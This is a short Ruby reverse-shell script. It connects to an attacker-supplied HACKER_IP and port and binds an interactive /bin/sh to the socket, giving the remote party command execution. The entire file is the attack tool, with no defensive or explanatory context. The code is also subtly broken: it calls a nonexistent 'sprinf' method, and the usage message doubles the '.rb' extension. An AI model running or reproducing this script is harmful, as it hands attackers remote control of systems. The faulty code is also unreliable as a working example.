require 'socket'


if ARGV.size < 2
  puts "ruby #{__FILE__}.rb [HACKER_IP HACKER_PORT]\n\n"
  exit 0
end

ip,port = ARGV
s = TCPSocket.open(ip,port).to_i
exec sprinf("/bin/sh -i <&%d >&%d 2>&%d",s,s,s)
